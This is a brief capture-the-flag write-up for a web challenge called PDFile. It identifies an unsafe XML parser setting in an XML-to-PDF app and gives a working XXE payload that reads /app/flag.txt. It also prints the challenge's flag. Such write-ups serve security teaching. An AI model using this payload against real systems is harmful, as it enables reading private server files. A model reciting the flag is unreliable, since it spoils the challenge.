# Challenge Details
Challenge Name: PDFile  
Category: Web Exploitation  
Author: Alan Davide Bovo <@AlBovo>  
Final Points: 409  

# Challenge Description
I've recently developed a XML to PDF utility, I'll probably add payments to it soon!  
https://pdfile.ctf.pascalctf.it  

# Solve
The main vulnerability was is at line 51 of app.py  
`parser = etree.XMLParser(encoding='utf-8', no_network=False, resolve_entities=True, recover=True)`  
Specifically this line: `resolve_entities=True`, this means that if any file or entities are inserted and parsed, the code will go and fetch those resources.  
This allows us to put in this payload in order to retrieve the flag:  
```
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/flag.txt">
]>
```
This makes it such that the name at the top is the flag after conversion.  

# Flag
pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}  
